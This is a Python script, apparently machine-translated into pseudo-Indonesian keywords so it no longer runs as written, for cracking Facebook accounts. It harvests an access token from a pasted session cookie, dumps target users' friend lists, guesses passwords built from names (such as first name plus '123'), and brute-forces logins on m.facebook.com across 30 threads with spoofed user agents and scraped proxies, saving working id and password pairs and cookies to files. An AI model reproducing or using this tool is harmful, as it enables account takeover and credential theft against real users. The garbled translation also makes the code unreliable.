#-----------------[ IMPOR-MODU ]-------------------
permintaan impor,bs4,json,os,sys,random,datetime,time,re
impor urllib3,kaya,base64
dari rich.table impor Tabel sebagai saya
dari rich.console impor Console sebagai sol
dari bs4 impor BeautifulSoup sebagai sop
dari bersamaan.futures mengimpor ThreadPoolExecutor sebagai tred
dari rich.console mengimpor Grup sebagai gp
dari rich.panel mengimpor Panel sebagai nel
dari rich import print as cetak
dari rich.markdown impor Penurunan harga sebagai tanda
dari rich.columns impor Kolom sebagai col
dari cetakan impor kaya sebagai rprint
dari kaya impor cantik
dari rich.text impor Teks sebagai tekz
cantik.instal()
CON=sol()
#------------------[ USER-AGENT-DEFAULT ]-------------------#
ugen2=[]
ugen=[]
kokbrut=[]
ses=permintaan.Sesi()
prinsip=[]
mencoba:
    prox= request.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    buka('.proxy.txt','w').tulis(prox)
kecuali Pengecualian sebagai e:
    keluar (e)
untuk xd dalam kisaran (10000):
    a='Mozilla/5.0 (Symbian/3; Seri60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, seperti Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-kita; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K' , 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', ' X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K' , 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', ' X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
    h=random.randrange(73.100)
    saya = '0'
    j=random.randrange(4200,4900)
    k=random.randrange(40.150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def uaku():
	mencoba:
		ua=open('bbnew.txt','r').read().splitlines()
		untuk ub di ua :
			ugen.tambahkan(ub)
	kecuali:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=buka('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		untuk un di aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDIKASI ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[], [],[],[],[]
kokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]-------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
pak = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #MERAH +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni' ,'7':'July','8':'August','9':'September','10':'October','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni' ,'07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ DUKUNGAN MESIN ]---------------#
def renv_xy(u):
        untuk e di u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
jelas ():
	os.system('hapus')
def kembali():
	Gabung()
#------------------[ LOGO-BANNER ]-----------------#
spanduk def():
	print(f"""(+) Crack Sederhana Facebook\n(+) Dibuat Oleh {M}Indonesia {P}Coder""")
#--------------------[ BAGIAN-MASUK ]--------------#
def masuk():
	mencoba:
		token = buka('.token.txt','r').read()
		cok = buka('.cok.txt','r').read()
		tokenku.append(token)
		mencoba:
			sy = request.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['nama']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		kecuali KeyError:
			login_lagi334()
		kecuali request.exceptions.ConnectionError:
			li = ' MASALAH KONEKSI INTERNET, PERIKSA DAN COBA LAGI '
			lo = tanda (li, gaya = 'merah')
			sol().print(lo, style='cyan')
			KELUAR()
	kecuali IOError:
		login_lagi334()
def login_lagi334():
	mencoba:
		os.system('hapus')
		spanduk()
		cetak(nel('\tCookies Capture Extension Suggestion : [green]Cookiedough[white]'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'Masukkan Cookie :{asu} ')
		data = request.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/ 5.0 AppleWebKit/420+ (KHTML, seperti Gecko) Safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","asal": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en ;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng ,*[dimasukkan oleh cython untuk menghindari komentar lebih dekat]/[disisipkan oleh cython untuk menghindari komentar dimulai]*;q=0.8","content-type":"text/html;charset=utf-8"}, cookie = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f' {x}[{h}•{x}]{h} LOGIN SUKSES.........Jalankan perintah lagi!!!!{x} ');time.sleep(1)
		KELUAR()
	kecuali Pengecualian sebagai e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f' %s[%sx%s]%s LOGIN GAGAL.....PERIKSA AKUN ANDA !!%s'%(x,k,x,m,x))
		KELUAR()
#------------------[ BAGIAN-MENU ]----------------#
menu def (nama_saya, id_saya):
	mencoba:
		token = buka('.token.txt','r').read()
		cok = buka('.cok.txt','r').read()
	kecuali IOError:
		print('[×] Cookie Kedaluwarsa ')
		waktu.tidur(5)
		login_lagi334()
	os.system('hapus')
	spanduk()
	mencetak('')
	ip = request.get("https://api.ipify.org").text
	renv_xy(f'>> Id Anda : '+str(my_id))
	renv_xy(f'>> Ip Anda : {ip}')
	print(f'>> Github : https://github.com/RENVVV')
	mencetak('')
	cetak('[white]1. Crack Public\n0. Exit[white]')
	_____renv__renv___ = input('\n>> Pilih : ')
	mencetak('')
	jika _____renv__renv___ di ['1']:
		sampah_massal()
	elif _____renv__renv___ di ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Berhasil Keluar+Hapus Cookie')
		KELUAR()
	kalau tidak:
		print('>> masukan dengan benar')
		kembali()
kesalahan def():
	print(f'{k}>> Maaf, fitur ini masih dalam perbaikan {x}')
	waktu.tidur(4)
	kembali()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	mencoba:
		token = buka('.token.txt','r').read()
		cok = buka('.cok.txt','r').read()
	kecuali IOError:
		KELUAR()
	mencoba:
		jum = int(input('>> masukan jumlah target ? : '))
	kecuali ValueError:
		print('>> salah input')
		KELUAR()
	jika melompat<1 atau melompat>100:
		print('>> Gagal Dump Id mungkin id tidak publik ')
		KELUAR()
	ses=permintaan.Sesi()
	yz = 0
	untuk bertemu dalam jangkauan (jum):
		yz+=1
		kl = input('Masukkan Id '+str(yz)+' : ')
		uid.tambahkan(kl)
	untuk pengguna di uid:
		mencoba:
			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies': kok}).json()
			untuk mi di col['teman']['data']:
				mencoba:
					iso = (mi['id']+'|'+mi['nama'])
					jika iso di id:pass
					lain:id.append(iso)
				kecuali: lanjutkan
		kecuali (KeyError,IOError):
			lulus
		kecuali request.exceptions.ConnectionError:
			print('>> sinyal tidak stabil ')
			KELUAR()
	mencoba:
		mencetak('')
		print(f'Total Id Terkumpul {h}'+str(len(id)))
		pengaturan()
	kecuali request.exceptions.ConnectionError:
		cetak(f'{x}')
		print('>> sinyal tidak stabil ')
		kembali()
	kecuali (KeyError,IOError):
		print(f'>>{k} Persahabatan Bukan Publik {x}')
		waktu.tidur(3)
		kembali()
#-------------[ PENGATURAN-IDZ ]---------------#
pengaturan def():
	print(f'\n{x}>> Pengaturan Pesanan ID ')
	mencetak('')
	print(f'{x}1. Id Lama Ke Baru (Tidak Direkomendasikan) ')
	print('2. Id Baru Ke Lama (Disarankan) ')
	print('3. Id Random (Sangat Direkomendasikan)')
	mencetak('')
	hu = input('Pilih : ')
	jika hu di ['1','01']:
		untuk tua di sortir(id):
			id2.tambahkan(tua)
			
	elif hu di ['2','02']:
		muda=[]
		untuk bacot di sortir(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		untuk xmud dalam jangkauan (bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu di ['3','03']:
		untuk bacot di id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	kalau tidak:
		print('>> masukan dengan benar')
		KELUAR()
		mencetak('')
		
	print('\n>> Input Metode URL Login ')
	mencetak('')
	print('1.m.facebook.com')
	mencetak('')
	hc = input('Pilih : ')
	jika hc di ['1','01']:
		method.append('ponsel')
	kalau tidak:
		method.append('ponsel')
	mencetak('')
	pwplus=input('>> Tambahkan Manual Sandi ( Y/t ) ')
	mencetak('')
	jika pwplus di ['y','Y']:
		pwpluss.append('ya')
		cetak('Masukkan tambahan password minimal 6 karakter\nContoh :[green] Indonesia,rahasia,katasandi[white] ')
		pwku=input('Masukkan Kata Sandi Tambahan : ')
		pwkuh=pwku.split(',')
		untuk xpw di pwkuh:
			pwnya.append(xpw)
	kalau tidak:
		pwpluss.append('tidak')
	sandi()
#-------------------[ DAFTAR DUNIA ]------------#
def kata sandi():
	mencetak('')
	print(f'>> Hasil {h}OK{x} Simpan di : {h}OK/%s {x}'%(okc))
	print(f'>> Hasil {k}CP{x} Simpan dalam : {k}CP/%s {x}'%(cpc))
	print(f'>> Mainkan Mode Pesawat Setiap 500 ID\n')
	dengan tred(max_workers=30) sebagai kumpulan:
		untuk yuzong di id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			jika len(nmf)<6:
				jika len(frs)<3:
					lulus
				kalau tidak:
					pwv.tambahkan(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			kalau tidak:
				jika len(frs)<3:
					pwv.tambahkan(nmf)
				kalau tidak:
					pwv.tambahkan(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			jika 'ya' di pwpluss:
				untuk xpwd di pwnya:
					pwv.tambahkan(xpwd)
			lain: lulus
			jika 'seluler' dalam metode:
				pool.submit(crack,idf,pwv)
			kalau tidak:
				pool.submit(crack,idf,pwv)
	mencetak('')
	cetak('\t[cyan]>>[green] Berhasil Crack,Jangan Lupa Kirim Masukan Anda Setelah Menggunakan My Script [cyan] <<[white] ')
	print(f'{h} Oke : {h}%s '%(ok))
	print(f'{k} CP : {k}%s{x} '%(cp))
	mencetak('')
	print('>> Apakah Anda Ingin Detektor Titik Pemeriksaan Pengguna ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	jika woi di ['y','Y']:
		cek_opsi()
	kalau tidak:
		print(f'\t{x}>>{k} Selamat Tinggal Terima Kasih Telah Menggunakan Skrip Saya {x} << ')
		waktu.tidur(2)
		kembali()
#--------------------[ METODE-MOBILE ]-----------------#
def retak (idf, pwv):
	lingkaran global, oke, cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	ff = '%'
	print('\r%s%s/%s ok : %s cp : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff ),x), end=' ');sys.stdout.flush()
	ua =Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36
	ua2 =Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36
	ses = permintaan.Sesi()
	untuk pw di pwv:
		mencoba:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade -insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image /apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors ','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2. 3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%2252%257B253Dlogger%257B153Dlogger%257B15_256%257B15stat% 23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Df. app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226dpc instaunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8272challen%252d2%_23f8-463c-8272% 253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=usang&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search(' name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/ v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%32%-2368f15bae%-8976606fbae 2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned=token%2Csigned login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Bukan A;Merek";v="99" , "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests' : '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3; q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest' : 'kosong','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog %2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%225220_57B%26815_257B_25220id%ba%2253D%257B -8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbkoneksi%253Dfbkoneksi%253. %3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f36%26tp app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8272Cllen%25262252660%-23f8-463c-827 253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding,': 'accept-encoding,': 'accept-encoding,': ' id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8, id;q=0,7'}display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8, id;q=0,7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},header =heade,allow_redirects=Salah)
			jika "checkpoint" di po.cookies.get_dict().keys():
				print(f'\r{b}CP Masuk {M}{K}{idf}|{pw}{N}\n└── {x}Agen Pengguna{x} : {x} {M}{ua} {M}')
				buka('CP/'+cpc,'a').tulis(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+1
				merusak
			elif "c_user" di ses.cookies.get_dict().keys():
				oke +=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam ses.cookies.get_dict().items() ])
				print(f'\r{b}Masuk Oke {M}{H}{idf}|{pw}\n└── {kuki}\n{x}└── {x}Agen Pengguna{x} : { x} {M}{ua}{H}')
				buka('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(sesi,coki)
				merusak
				
			kalau tidak:
				melanjutkan
		kecuali request.exceptions.ConnectionError:
			waktu.tidur(31)
	lingkaran+=1
#------------------------[ SYSTEM-CONTROL ]---------#
jika __name__=='__main__':
	coba:os.system('git tarik')
	kecuali: lulus
	coba:os.mkdir('Oke')
	kecuali: lulus
	coba:os.mkdir('CP')
	kecuali: lulus
	coba:os.system('sentuh .prox.txt')
	kecuali: lulus
	Gabung()

#>>>>> TERIMA KASIH INI <<<<<<<#
#>>>>> renv_renv_renv <<<<<#